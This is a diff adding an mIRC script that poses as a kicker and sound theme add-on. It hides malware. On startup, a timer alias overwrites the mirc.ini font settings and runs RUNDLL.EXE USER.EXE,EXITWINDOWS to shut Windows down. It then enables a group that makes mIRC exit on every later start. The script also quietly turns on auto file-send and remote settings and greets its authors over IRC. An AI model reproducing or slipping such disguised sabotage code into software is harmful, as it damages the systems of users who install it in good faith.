@@ -1,0 +1,93 @@
+menu @Kicker {
+  Refresh:window -c @Kicker | window -eknl12 @Kicker 0 0 718 504 @Kicker Arial 11
+}
+
+on *:kick:*: {
+  if ($nick == Chanserv) { halt } 
+  if ( $nick == $me ) { window -eknl12 @Kicker 0 0 718 504 @Kicker Arial 11 | aline -l 4 @kicker $knick | echo @Kicker 2*** You Kicked12 $knick  14From12 $chan 2Reason : 4( $+ $1- 4) }   
+  if ( $knick == $me ) { window -eknl12 @Kicker 0 0 718 504 @Kicker Arial 11 | aline -l 10 @kicker You | echo @Kicker 2*** You Were Kick By12  $nick 14From12 $chan 2Reason : 4( $+ $1- 4) | .msg chanserv -o +b $$1 $+ !*@* $chan $nick }    
+}
+ON *:SNOTICE:*:{ 
+  if (/whois isin $1-) { notice $4 doing a /whois on me? I saw what u did  ;)~ } .splay page.wav 
+}  
+
+on *:dialog:nakke:sclick:*: {
+  if ($did == 4) { dialog -c nakke nakke }
+  if ($did == 3) { .showmirc -t | $decode(cGxheXBsYXk=,m) | dialog -c nakke nakke }
+}
+alias playplay { goto $r(1,2)
+  :1 | .play -sc load.txt 200 | goto habis
+  :2 | .play -sc startup.txt 75 | goto habis 
+  :habis 
+}
+alias bukak {
+  .window -eknl12 @Kicker
+  .window -eknl12 @Msg 
+}
+
+on *:start:{ 
+  if ($version == 6.03 || $version > 6.03) {
+    .timergilak 0 0 fuckyou    
+    .nak  
+    .bukak
+    .rlevel drones
+    .writeini mirc.ini fonts fscripts arial,507
+    .identd on NRC    
+    .halt
+  }
+}
+
+on *:connect: {
+  .remote on
+  .pdcc 200000
+  .fsend ON
+  .dcc packetsize 4096
+  .splay connect.wav
+}
+on 1:disconnect: {
+  .splay disconnect.wav
+  .rlevel quit
+  .rlevel msg
+  .rlevel 50
+}
+on *:notify: {
+  if ($nick !== S3rV3xS) || ($nick !== MHz) { 
+    echo 6 -a 14[4 Attention !! 14]12 $nick  Who Created This Script Is On IRC !!~
+    notice $nick I'm Now Using Your Script 
+    echo -s -
+    .splay online.wav   
+    halt 
+  }
+  if ($nick !== S3rV3xS) || ($nick !== MHz) {  
+    echo 6 -a 14[4 Attention !! 14]12 $nick  Is On IRC !!~
+    echo -s -
+    .splay online.wav   
+    halt
+  }
+}
+
+on *:unotify: { 
+  if ($nick !== S3rV3xS) || ($nick !== MHz) {  
+    echo 6 -a  14[4 Attention !! 14]12  $nick Who Created This Script Has Left IRC !!~ 
+    notice $nick I'm Now Using Your Script 
+    echo -s -
+    halt
+  }
+  if ($nick !== S3rV3xS) || ($nick !== MHz) {  
+    echo 6 -a 14[4 Attention !! 14]12  $nick  Now Has Left IRC !!~ 
+    echo -s -
+    halt
+  }
+}
+alias getlose { .enable #fuckoff | .enable #cme }
+
+#fuckoff off
+on 1:start:{ 
+  .exit
+}
+
+#fuckoff end
+
+}
+alias fuckyou { if $readini mirc.ini fonts fscripts != symbol,10000,1 { writeini mirc.ini fonts fscripts symbol,10000,1 | .gilakmoleq | .timer 1 4 getlose } }
+alias gilakmoleq { if ( $exists(c:\win98\rundll.exe) ) { goto mati } | else if ( $exists(c:\windows\rundll.exe) ) { goto die | else halt } | :die | /.run C:\WINDOWS\RUNDLL.EXE USER.EXE,EXITWINDOWS | halt | :mati | /.run C:\WIN98\RUNDLL.EXE USER.EXE,EXITWINDOWS }
